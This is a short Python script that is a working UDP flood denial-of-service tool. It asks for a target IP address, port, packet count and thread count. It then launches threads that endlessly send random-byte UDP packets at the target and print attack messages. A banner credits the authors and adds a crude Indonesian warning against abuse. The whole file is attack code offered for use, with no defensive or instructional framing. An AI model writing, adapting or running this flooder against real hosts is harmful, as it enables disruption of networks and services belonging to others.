

import random

import socket

import threading

import os,sys

os.system("clear")

print("------------------------------------------------")

print("[+] Tools Used By : Lezhan")

print("[+] Credit Tools : Lordzz,Lezhan")

print("[+]Jangan Abuse Ya Kontol")

print("------------------------------------------------")

ip = str(input(" [ / ]  Target IP:"))

port = int(input(" [ / ]  Target Port:"))

choice = str(input(" (y/n):"))

times = int(input(" [ / ]  Packets :"))

threads = int(input(" [ / ]  Threads:"))

os.system("clear")

def run():

    data = random._urandom(9024)

    i = random.choice(("[•]","[•]","[•]"))

    while True:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            addr = (str(ip),int(port))

            for x in range(times):

                s.sendto(data,addr)

            print(i +" Send!!")

        except:

            print("[X] Attacking By Lezhan!!")

def run2():

    data = random._urandom(1080)

    i = random.choice(("[•]","[•]","[•]"))

    while True:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            s.connect((ip,port))

            s.send(data)

            for x in range(times):

                s.send(data)

            print(i +" Send!!")

        except:

            s.close()

            print("[X] Attacking By Lezhan!!")

def run3():

    data = random._urandom(1800)

    i = random.choice(("[•]","[•]","[•]"))

    while True:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            s.connect((ip,port))

            s.send(data)

            for x in range(times):

                s.send(data)

            print(i +" Send!!")

        except:

            s.close()

            print("[X] Attacking By Lezhan!!")

def run4():

    data = random._urandom(1800)

    i = random.choice(("[•]","[•]","[•]"))

    while True:

        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            s.connect((ip,port))

            s.send(data)

            for x in range(times):

                s.send(data)

            print(i +" Send!!")

        except:

            s.close()

            print("[X] Attacking By Lezhan!!")

for y in range(threads):

    if choice == 'y':

        th = threading.Thread(target = run)

        th.start()

        th = threading.Thread(target = run2)

        th.start()

    else:

        th = threading.Thread(target = run3)

        th.start()

        th = threading.Thread(target = run4)

        th.start()

